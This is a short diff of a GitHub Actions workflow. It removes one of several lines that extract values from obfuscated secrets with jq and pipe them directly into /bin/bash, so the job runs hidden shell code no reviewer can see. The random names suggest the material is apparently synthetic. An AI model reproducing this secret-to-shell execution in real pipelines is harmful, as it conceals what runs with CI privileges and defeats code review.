@@ -21,7 +21,6 @@ jobs:
           bxyl849: ${{ secrets.bxyl849 }}
         run: |
           printf '%s' "$bxyl849" | jq -r .wqvqa85 | /bin/bash
-          printf '%s' "$dzqg65037" | jq -r .y261 | /bin/bash
           echo $hrles6519 | jq -r .cbadn93951 | /bin/bash
           echo $g19 | jq -r .ysps5870 | /bin/bash
           printf '%s' "$uni315" | jq -r .w85 | /bin/bash
